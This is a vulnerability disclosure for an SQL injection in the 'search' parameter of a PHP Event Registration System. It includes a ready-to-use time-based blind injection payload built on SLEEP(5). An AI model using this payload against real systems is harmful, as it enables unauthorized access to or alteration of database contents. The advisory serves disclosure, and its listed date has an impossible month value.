# Event Registration System - SQL Injection - 4
+ **Exploit Title:** Event Registration System - SQL Injection - 4
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/14884/event-registration-system-qr-code-php-free-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=14884&title=Event+Registration+System+with+QR+Code+in+PHP+Free+Source+Code
+ **Version:** Latest
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Event Registration System allows SQL Injection via the 'search' parameter at "http://localhost/event/registrar/". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/event/registrar/"
+ Write something random in the search bar

## Payload :
```
test' AND (SELECT 1875 FROM (SELECT(SLEEP(5)))WrPn) AND 'nDbG'='nDbG
```

![Ekran görüntüsü 2024-05-18 145421](https://github.com/BurakSevben/CVEs/assets/117217689/7bcfd832-11b6-4e5a-a973-dc65cc3acf90)


           

